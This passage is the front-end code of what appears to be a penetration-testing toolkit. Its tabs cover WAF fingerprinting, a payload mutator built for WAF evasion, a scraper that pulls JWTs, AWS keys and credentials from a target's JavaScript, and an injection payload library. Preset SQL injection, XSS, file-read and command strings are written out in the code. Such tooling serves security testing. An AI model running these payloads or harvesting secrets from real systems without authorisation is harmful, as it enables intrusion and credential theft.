                className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-sm text-white placeholder-gray-500 font-mono focus:outline-none focus:border-cyber-cyan"
              />
              <button
                onClick={handleWafProbe}
                disabled={wafLoading}
                className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold font-mono text-sm transition-all shrink-0 disabled:opacity-50"
              >
                {wafLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <ShieldAlert className="w-4 h-4" />}
                {wafLoading ? 'Fingerprinting...' : 'Probe Target'}
              </button>
            </div>

            {wafError && (
              <div className="p-3 bg-red-950/30 border border-red-500/30 rounded-lg text-red-400 text-xs font-mono flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                {wafError}
              </div>
            )}

            {/* Probe Results */}
            {wafResult && (
              <div className="p-4 bg-cyber-darker border border-cyber-border rounded-xl space-y-3">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-cyber-border pb-3">
                  <div className="flex items-center gap-2">
                    <span className={`px-2.5 py-1 rounded-md font-bold uppercase text-xs ${
                      wafResult.detected 
                        ? 'bg-red-900/40 text-red-400 border border-red-500/40' 
                        : 'bg-emerald-900/40 text-emerald-400 border border-emerald-500/40'
                    }`}>
                      {wafResult.detected ? 'WAF Detected' : 'No WAF Identified'}
                    </span>
                    <span className="text-white font-bold text-sm">{wafResult.waf}</span>
                  </div>
                  <div className="text-gray-400 text-xs">
                    Confidence: <span className="text-cyber-cyan font-bold">{wafResult.confidence}</span> | Status: <span className="text-yellow-400 font-bold">{wafResult.status_code}</span>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                  <div>
                    <span className="text-gray-500 block mb-1">Server Header:</span>
                    <code className="text-gray-300 bg-black/60 px-2 py-1 rounded block truncate border border-cyber-border">
                      {wafResult.server_header || 'None'}
                    </code>
                  </div>
                  <div>
                    <span className="text-gray-500 block mb-1">Probe URI:</span>
                    <code className="text-cyber-cyan bg-black/60 px-2 py-1 rounded block truncate border border-cyber-border">
                      {wafResult.probe_url}
                    </code>
                  </div>
                </div>

                {wafResult.matched_headers?.length > 0 && (
                  <div>
                    <span className="text-gray-500 block mb-1">Matched WAF Signature Headers:</span>
                    <div className="flex flex-wrap gap-1.5">
                      {wafResult.matched_headers.map((h: string, idx: number) => (
                        <span key={idx} className="px-2 py-0.5 rounded bg-red-950/40 border border-red-500/30 text-red-300">
                          {h}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Section 2: Adversarial Payload Mutator */}
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2">
                <Flame className="w-4 h-4 text-cyber-cyan" />
                Adversarial Payload Mutator (WAF Evasion Engine)
              </h3>
              <span className="px-2 py-0.5 rounded bg-black/60 border border-cyber-border text-cyber-cyan text-[10px]">
                {mutatedVariants.length} Active Bypass Formats
              </span>
            </div>

            <p className="text-gray-400 text-xs">
              Synthesizes URL double-encoding, SQL comment splitting (<code className="text-cyber-cyan">UN/**/ION</code>), case jittering, internal field separators, and memory execution pipes.
            </p>

            <div className="space-y-3">
              <div className="flex flex-col sm:flex-row gap-3">
                <input
                  type="text"
                  value={rawPayload}
                  onChange={(e) => setRawPayload(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleMutatePayload()}
                  placeholder="Enter raw payload to mutate (e.g. ' UNION SELECT 1,2,3--)"
                  className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-sm text-cyber-cyan font-mono focus:outline-none focus:border-cyber-cyan"
                />
                <button
                  onClick={() => handleMutatePayload()}
                  disabled={mutating}
                  className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold font-mono text-sm transition-all shrink-0"
                >
                  {mutating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
                  Mutate Payload
                </button>
              </div>

              {/* Quick Presets */}
              <div className="flex flex-wrap items-center gap-2 pt-1">
                <span className="text-gray-500 text-[11px]">Quick Payloads:</span>
                {[
                  { label: "SQLi Union", val: "' UNION SELECT 1,2,3--" },
                  { label: "SQLi Auth", val: "' OR '1'='1' -- -" },
                  { label: "XSS Alert", val: "<script>alert(1)</script>" },
                  { label: "LFI Passwd", val: "/etc/passwd" },
                  { label: "Command RCE", val: "cat /flag.txt" },
                ].map((preset, idx) => (
                  <button
                    key={idx}
                    onClick={() => {
                      setRawPayload(preset.val);
                      handleMutatePayload(preset.val);
                    }}
                    className="px-2.5 py-1 rounded bg-cyber-darker hover:bg-cyber-cyan/10 border border-cyber-border hover:border-cyber-cyan text-gray-300 hover:text-cyber-cyan text-[11px] transition-all"
                  >
                    {preset.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Mutated Variants Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 pt-2">
              {mutatedVariants.map((item, idx) => (
                <div
                  key={idx}
                  className="bg-cyber-darker border border-cyber-border hover:border-cyber-cyan/40 rounded-xl p-3.5 space-y-2 transition-all"
                >
                  <div className="flex items-center justify-between">
                    <div>
                      <span className="text-white font-bold text-xs">{item.name}</span>
                      <p className="text-gray-500 text-[10px] mt-0.5">{item.description}</p>
                    </div>
                    <button
                      onClick={() => handleCopy(item.payload, `mut_${idx}`)}
                      className="p-1.5 rounded-lg bg-black/60 border border-cyber-border hover:border-cyber-cyan text-gray-300 hover:text-cyber-cyan transition-all"
                    >
                      {copiedId === `mut_${idx}` ? (
                        <Check className="w-3.5 h-3.5 text-cyber-cyan" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                  <pre className="bg-black/80 border border-cyber-border/70 rounded-lg p-2.5 text-cyber-cyan text-xs overflow-x-auto whitespace-pre-wrap select-all font-mono">
                    {item.payload}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ============================================================== */}
      {/* SUB-TAB 3: JS Secret & Endpoint Hunter (from ShadowCat) */}
      {/* ============================================================== */}
      {activeSubTab === 'js_hunter' && (
        <div className="space-y-6 font-mono text-xs">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2">
                <Key className="w-4 h-4 text-cyber-cyan" />
                JavaScript Secret & Endpoint Hunter
              </h3>
              <div className="flex bg-cyber-darker border border-cyber-border rounded-lg p-0.5">
                <button
                  onClick={() => setJsSourceMode('url')}
                  className={`px-3 py-1 rounded text-xs font-bold transition-all ${
                    jsSourceMode === 'url' ? 'bg-cyber-cyan text-black' : 'text-gray-400 hover:text-white'
                  }`}
                >
                  Target URL / App
                </button>
                <button
                  onClick={() => setJsSourceMode('code')}
                  className={`px-3 py-1 rounded text-xs font-bold transition-all ${
                    jsSourceMode === 'code' ? 'bg-cyber-cyan text-black' : 'text-gray-400 hover:text-white'
                  }`}
                >
                  Raw JavaScript
                </button>
              </div>
            </div>

            <p className="text-gray-400 text-xs">
              Scrapes web assets and compiled JavaScript bundles (Webpack/Vite) to extract hidden REST/GraphQL routes, JWT tokens, AWS keys, internal IPv4 subnets, and credentials.
            </p>

            {jsSourceMode === 'url' ? (
              <div className="flex flex-col sm:flex-row gap-3">
                <input
                  type="text"
                  value={jsTargetUrl}
                  onChange={(e) => setJsTargetUrl(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleAnalyzeJs()}
                  placeholder="https://target.com or https://target.com/assets/index.js"
                  className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-sm text-white placeholder-gray-500 font-mono focus:outline-none focus:border-cyber-cyan"
                />
                <button
                  onClick={handleAnalyzeJs}
                  disabled={jsLoading}
                  className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold font-mono text-sm transition-all shrink-0 disabled:opacity-50"
                >
                  {jsLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
                  {jsLoading ? 'Harvesting...' : 'Scan Scripts'}
                </button>
              </div>
            ) : (
              <div className="space-y-3">
                <textarea
                  rows={6}
                  value={jsRawCode}
                  onChange={(e) => setJsRawCode(e.target.value)}
                  placeholder="Paste JavaScript / HTML bundle source code here..."
                  className="w-full bg-cyber-darker border border-cyber-border rounded-lg p-3 text-xs text-white placeholder-gray-500 font-mono focus:outline-none focus:border-cyber-cyan"
                />
                <button
                  onClick={handleAnalyzeJs}
                  disabled={jsLoading}
                  className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold font-mono text-sm transition-all disabled:opacity-50"
                >
                  {jsLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Key className="w-4 h-4" />}
                  Analyze Raw Code
                </button>
              </div>
            )}

            {jsError && (
              <div className="p-3 bg-red-950/30 border border-red-500/30 rounded-lg text-red-400 text-xs font-mono flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                {jsError}
              </div>
            )}
          </div>

          {/* Analysis Results */}
          {jsResult && (
            <div className="space-y-4">
              {/* Stats Summary */}
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3.5">
                  <div className="text-gray-500 text-[11px]">Discovered Routes</div>
                  <div className="text-cyber-cyan font-bold text-lg mt-0.5">{jsResult.endpoints_count || 0}</div>
                </div>
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3.5">
                  <div className="text-gray-500 text-[11px]">Sensitive Secrets & Keys</div>
                  <div className={`font-bold text-lg mt-0.5 ${jsResult.secrets_count > 0 ? 'text-red-400' : 'text-emerald-400'}`}>
                    {jsResult.secrets_count || 0}
                  </div>
                </div>
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3.5 col-span-2 sm:col-span-1">
                  <div className="text-gray-500 text-[11px]">Analyzed Sources</div>
                  <div className="text-gray-300 font-bold text-lg mt-0.5">{jsResult.analyzed_scripts?.length || 0}</div>
                </div>
              </div>

              {/* Secrets Card */}
              {jsResult.secrets && jsResult.secrets.length > 0 && (
                <div className="bg-cyber-card border border-red-500/30 rounded-xl p-5 space-y-3">
                  <h4 className="text-red-400 font-bold uppercase flex items-center gap-2 text-xs">
                    <ShieldAlert className="w-4 h-4" /> High-Risk Leaked Secrets & Credentials
                  </h4>
                  <div className="space-y-2">
                    {jsResult.secrets.map((sec: any, idx: number) => (
                      <div key={idx} className="bg-cyber-darker border border-red-500/20 rounded-lg p-3 flex items-center justify-between gap-3">
                        <div className="overflow-hidden">
                          <span className="px-2 py-0.5 rounded bg-red-950/60 border border-red-500/30 text-red-300 text-[10px] uppercase font-bold">
                            {sec.type}
                          </span>
                          <pre className="text-white font-mono text-xs mt-1.5 truncate select-all">
                            {sec.value}
                          </pre>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          {(sec.type.toLowerCase().includes('jwt') || sec.value.startsWith('ey')) && (
                            <button
                              onClick={() => sendToTab('jwt', sec.value)}
                              className="px-2 py-1 rounded bg-purple-950/80 border border-purple-500/40 text-purple-300 hover:bg-purple-900 text-[10px] font-mono cursor-pointer transition-colors"
                              title="Send to JWT Studio"
                            >
                              {'[-> JWT]'}
                            </button>
                          )}
                          <button
                            onClick={() => sendToTab('hash', sec.value)}
                            className="px-2 py-1 rounded bg-yellow-950/80 border border-yellow-500/40 text-yellow-300 hover:bg-yellow-900 text-[10px] font-mono cursor-pointer transition-colors"
                            title="Send to Hash Cracker"
                          >
                            {'[-> Hash]'}
                          </button>
                          <button
                            onClick={() => handleCopy(sec.value, `sec_${idx}`)}
                            className="p-1.5 rounded bg-black/60 border border-cyber-border hover:border-cyber-cyan text-gray-300 hover:text-cyber-cyan transition-all"
                            title="Copy secret"
                          >
                            {copiedId === `sec_${idx}` ? <Check className="w-3.5 h-3.5 text-cyber-cyan" /> : <Copy className="w-3.5 h-3.5" />}
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Endpoints Card */}
              <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-3">
                <h4 className="text-cyber-cyan font-bold uppercase flex items-center gap-2 text-xs">
                  <Layers className="w-4 h-4" /> Discovered Endpoints & API Routes
                </h4>
                {jsResult.endpoints && jsResult.endpoints.length > 0 ? (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {jsResult.endpoints.map((ep: string, idx: number) => {
                      const fullTargetUrl = (() => {
                        if (ep.startsWith('http://') || ep.startsWith('https://')) return ep;
                        const base = jsTargetUrl || 'http://localhost:8000';
                        const trimmedBase = base.endsWith('/') ? base.slice(0, -1) : base;
                        const trimmedEp = ep.startsWith('/') ? ep : `/${ep}`;
                        return `${trimmedBase}${trimmedEp}`;
                      })();
                      return (
                        <div key={idx} className="bg-cyber-darker border border-cyber-border rounded-lg p-2.5 flex items-center justify-between gap-2">
                          <code className="text-cyber-cyan font-mono text-xs truncate select-all">{ep}</code>
                          <div className="flex items-center gap-1 shrink-0">
                            <button
                              onClick={() => sendToTab('web', fullTargetUrl, 'repeater_url')}
                              className="px-1.5 py-0.5 rounded bg-cyber-cyan/10 border border-cyber-cyan/40 text-cyber-cyan hover:bg-cyber-cyan/20 text-[10px] font-mono cursor-pointer transition-colors"
                              title="Send to Burp Repeater"
                            >
                              {'[-> Repeater]'}
                            </button>
                            <button
                              onClick={() => handleCopy(ep, `ep_${idx}`)}
                              className="p-1 rounded bg-black/40 hover:text-cyber-cyan text-gray-400 transition-all"
                              title="Copy endpoint"
                            >
                              {copiedId === `ep_${idx}` ? <Check className="w-3 h-3 text-cyber-cyan" /> : <Copy className="w-3 h-3" />}
                            </button>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <p className="text-gray-500 text-xs">No explicit endpoint paths detected in target scripts.</p>
                )}
              </div>

              {/* Script Sources */}
              {jsResult.analyzed_scripts && jsResult.analyzed_scripts.length > 0 && (
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
                  <h4 className="text-gray-400 font-bold uppercase text-[11px]">Inspected Script Assets</h4>
                  <ul className="list-disc list-inside space-y-1 text-gray-500 text-[11px] truncate">
                    {jsResult.analyzed_scripts.map((src: string, idx: number) => (
                      <li key={idx} className="truncate">{src}</li>
                    ))}
                  </ul>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* ============================================================== */}
      {/* SUB-TAB 4: Injection Workbench & Payloads Library */}
      {/* ============================================================== */}
      {activeSubTab === 'payloads' && (
        <div className="space-y-5 font-mono text-xs">
          {/* Controls Bar */}
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-4 flex flex-col md:flex-row items-center justify-between gap-3">
            <div className="flex items-center gap-1.5 overflow-x-auto w-full md:w-auto">
              {[
                { id: 'all', label: 'All Payloads' },
                { id: 'sqli', label: 'SQLi' },
                { id: 'ssti', label: 'SSTI' },
                { id: 'xss', label: 'XSS' },
                { id: 'lfi', label: 'LFI / Traversal' },
              ].map((c) => (
                <button
                  key={c.id}
                  onClick={() => setPayloadCategory(c.id as any)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all shrink-0 ${
                    payloadCategory === c.id
                      ? 'bg-cyber-cyan text-black'
                      : 'bg-cyber-darker border border-cyber-border text-gray-400 hover:text-white'
                  }`}
                >
                  {c.label}
                </button>
              ))}
            </div>

            <div className="relative w-full md:w-64">
              <Search className="w-3.5 h-3.5 text-gray-500 absolute left-3 top-2.5" />
              <input
                type="text"
                value={searchFilter}
                onChange={(e) => setSearchFilter(e.target.value)}
                placeholder="Search payloads..."
                className="w-full bg-cyber-darker border border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-white placeholder-gray-600 focus:outline-none focus:border-cyber-cyan"
              />
            </div>
          </div>

          {/* Payloads List */}
          <div className="space-y-3">
            {filteredPayloads.map((item) => (
              <div
                key={item.id}
                className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2 hover:border-cyber-cyan/50 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 rounded bg-black/60 border border-cyber-border text-cyber-cyan font-bold uppercase text-[10px]">
                      {item.category}
                    </span>
                    <h4 className="text-white font-bold text-sm">{item.title}</h4>
                  </div>
                  <button
                    onClick={() => handleCopy(item.payload, item.id)}
                    className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-darker border border-cyber-border hover:border-cyber-cyan text-gray-300 hover:text-cyber-cyan transition-all"
                  >
                    {copiedId === item.id ? (
                      <>
                        <Check className="w-3.5 h-3.5 text-cyber-cyan" />
                        <span className="text-cyber-cyan font-bold">Copied!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-3.5 h-3.5" />
                        <span>Copy</span>
                      </>
                    )}
                  </button>
                </div>

                <p className="text-gray-400 text-xs">{item.desc}</p>

                <pre className="bg-black/75 border border-cyber-border rounded-lg p-3 text-cyber-cyan text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {item.payload}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
